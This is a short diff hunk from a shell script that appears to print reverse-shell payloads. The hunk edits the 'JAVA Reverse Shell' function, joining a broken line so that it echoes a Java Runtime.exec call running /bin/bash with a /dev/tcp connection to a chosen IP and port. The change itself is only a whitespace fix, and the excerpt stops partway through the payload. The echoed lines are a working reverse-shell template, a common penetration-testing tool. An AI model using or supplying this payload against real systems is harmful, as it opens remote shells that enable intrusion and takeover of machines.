@@ -154,8 +154,7 @@ function java_revs(){
 	echo -e "\e[1m\e[4mJAVA Reverse Shell\e[24m\e[21m\n"
 	echo -e ""
 	echo "r = Runtime.getRuntime()"
-	echo -n 'p
-       	= r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'
+	echo -n 'p= r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'
 	echo -n $IP
 	echo -n '/'
 	echo -n $PORT
